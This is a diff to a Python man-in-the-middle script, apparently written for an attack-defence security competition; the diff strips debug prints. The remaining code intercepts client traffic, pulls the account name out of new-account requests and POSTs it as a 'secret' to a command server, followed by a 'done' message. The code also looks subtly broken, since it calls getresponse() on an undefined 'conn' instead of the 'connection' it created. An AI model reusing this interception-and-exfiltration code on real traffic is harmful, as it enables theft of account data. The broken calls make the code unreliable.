@@ -33,8 +33,6 @@ def mitm(buff, direction):
         request = json.loads(hb)
         if request['mode'] != None and request['mode'] == 'new':
             account = request['account'] 
-            print(account)
-            sys.stdout.flush()
             sendLearnedAccountName(account)
             sendDoneRequest()
     elif direction == SERVER2CLIENT:
@@ -94,19 +92,16 @@ def sendLearnedAccountName(account):
     payload ={"type": "learned","variable": "account","secret": account}
     headers = {'Content-type': 'application/json'}
     json_data = json.dumps(payload)
-    print(json_data)
-    print(COMMANDSERVER,COMMANDPORT)
     connection.request('POST', 'REQUEST', json_data, headers)
     response = conn.getresponse()
     conn.close()
-    print('strange')
+    
 
 def sendDoneRequest():
     connection = http.client.HTTPSConnection(COMMANDSERVER,COMMANDPORT,timeout=10)
     payload = {"type": "done"}
     headers = {'Content-type': 'application/json'}
     json_data = json.dumps(payload)
-    print(json_data)
     connection.request('POST', 'REQUEST', json_data, headers)
     response = conn.getresponse()
     conn.close()
